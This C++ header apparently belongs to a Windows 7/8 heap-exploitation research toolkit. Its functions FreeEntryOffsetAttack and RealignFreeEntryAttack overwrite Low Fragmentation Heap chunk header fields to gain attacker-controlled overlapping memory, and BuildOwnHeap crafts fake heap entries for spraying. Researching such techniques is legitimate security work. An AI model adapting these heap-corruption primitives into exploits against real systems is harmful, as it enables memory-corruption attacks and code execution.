/**
 * @file W7Heap.h
 * @author created by: Peter Hlavaty
 * @author created on: 2012/04/11
 */

#ifndef __W7HEAP_H__
#define __W7HEAP_H__

#if defined(WIN7) || defined(WIN8)

#include "Heap.h"

#include "Debug.h"

class CW7Heap : public CHeap
{
#ifdef WIN64
	#define ARRAY_SIZE		0x80
//	#define ARRAY_SIZE		0x800
	#define Encoding		0x88
#else
	#define ARRAY_SIZE		0x80
	#define Encoding		0x50
#endif

#define ENCODE_FLAG_MASK	0x100000

#define LFH_SIZE 0x10
	static BYTE lfh_size;
#define T_LFH_SIZE (lfh_size++)

#define NEXT_CHUNK(chunk, n) ((ULONG_PTR)chunk + HEAP_MIN_PAGE_SIZE * (n + 1))


public:
	//x86 pre-allocated heap {freelist0} == 0x800  [/0x08 == HEAP_MIN_PAGE_SIZE]
	//x64 pre-allocated heap {freelist0} == 0xD00  [/0x10 == HEAP_MIN_PAGE_SIZE]
	void LFHTest()
	{
	}

	//frontend
	__checkReturn bool FreeEntryOffsetAttack(__in BYTE n, __in BYTE loop)
	{
		if (n >= ARRAY_SIZE)
			return false;
		
		if (!ActivateLFH(n))
			return false;

		for (int i = 0; i < loop; i++)
		{
			void* lfh_chunk;
			CHECK_ALLOC_RETB(lfh_chunk, n);
		}

		//get overflowable chunk!
		void* lfh_chunk_overflow;
		CHECK_ALLOC_RETB(lfh_chunk_overflow, n);
		Free(lfh_chunk_overflow);

		HEAP_ENTRY* header = GetChunk(lfh_chunk_overflow);
		memset(header, 'x', sizeof(HEAP_ENTRY));
		//EntryOffset overwrite (1st WORD in used DATA) - free LFH chunk to overwrite!!, next loop update FreeEntry Offset!
		*(WORD*)lfh_chunk_overflow = 2;

		return true;
	}

	__checkReturn bool RealignFreeEntryAttack(__in BYTE n, __in WORD emptyAllocs, __out void** pwnMem)
	{
		if (n >= ARRAY_SIZE)
			return false;

		if (!ActivateLFH(n))
			return false;

		//necessary to allocate from LFH in same USER-BLOCK (only in [0xFF * 2 * sizeof(ULONG_PTR)] distance)
		CHECK_ALLOC_RETB(*pwnMem, n);
		
		//seed LFH user-block, with loop count of free chunks!
		void* lfh_chunk;
		for (int i = 0; i < emptyAllocs; i++)
			CHECK_ALLOC_RETB(lfh_chunk, n);
		Free(lfh_chunk);

		//get overflowable chunk!
		void* lfh_chunk_overflow;
		CHECK_ALLOC_RETB(lfh_chunk_overflow, n);
		HEAP_ENTRY* header = GetChunk(lfh_chunk_overflow);

		//do overflow
		memset((BYTE*)header + sizeof(header->Reserved), 'X', sizeof(HEAP_ENTRY) - sizeof(header->Reserved));
		header->ExtendedBlockSignature = 5;
		header->EntryOffset = ((n + 1) | 1) * emptyAllocs;
		header->InterceptorValue = 2;

		Free(lfh_chunk_overflow);

		return true;
	}


protected:
	void EmptyLookAside(__in short n){};
	void FillLookAside(__in short n){};

	void BuildOwnHeap(__inout_ecount(count) HEAP_ENTRY* heap_chunks, __in size_t count)
	{
		if (0 == count)
			return;

		memset(heap_chunks, 0xFF, count * sizeof(HEAP_ENTRY));

		for (size_t i = 0; i < count; i++)
		{
			heap_chunks[i].Links.Flink = SPRAY_NEXT_FLINK(i + 1);
			heap_chunks[i].Links.Blink = SPRAY_NEXT_FLINK(i - 1);
			heap_chunks[i].Code1 &= (~ENCODE_FLAG_MASK);
		}

		if (0x1 != count)
			heap_chunks[0].Code1 = 0;//avoid to allocate this chunk!!

		heap_chunks[0].Links.Blink = SPRAY_NEXT_FLINK(count - 1);
		heap_chunks[count - 1].Links.Flink = SPRAY_NEXT_FLINK(0);
	}

	__checkReturn ULONG GetLfhBinSize(__in short n, __in bool first)//returned value is valid for first few USERDATA_HEADER
	{
		ULONG size = ((n + 1) * HEAP_MIN_PAGE_SIZE) * sizeof(ULONG_PTR) + sizeof(HEAP_USERDATA_HEADER);
		if (!first)
			size <<= 1;

		if (size > 0x8000)
			return 0;//for sure invalid output ... really this is simplified algo ;)

		ULONG page_shift = 6;
		while (size >> ++page_shift);
		return ((ULONG)(1 << page_shift) - HEAP_MIN_PAGE_SIZE - sizeof(HEAP_USERDATA_HEADER));
	}
};

BYTE CW7Heap::lfh_size = LFH_SIZE;

#endif //#if defined(WIN7) || defined(WIN8)

#endif //__W7HEAP_H__
